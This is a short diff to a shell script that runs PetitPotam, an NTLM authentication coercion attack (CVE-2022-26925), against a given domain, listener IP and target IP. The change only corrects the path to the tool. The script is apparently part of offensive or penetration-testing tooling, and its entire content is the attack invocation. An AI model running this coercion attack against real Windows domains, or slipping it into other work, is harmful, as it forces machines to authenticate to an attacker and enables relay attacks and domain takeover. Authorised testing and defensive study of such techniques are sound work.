@@ -14,4 +14,4 @@ fi
 echo "coercing with unauthent PetitPotam (CVE-2022-26925)"
 echo " "
 # PetitPotam.py -d domain listener_ip target_ip
-./PetitPotam.py -d "$1" "$2" "$3"
+./PetitPotam/PetitPotam.py -d "$1" "$2" "$3"
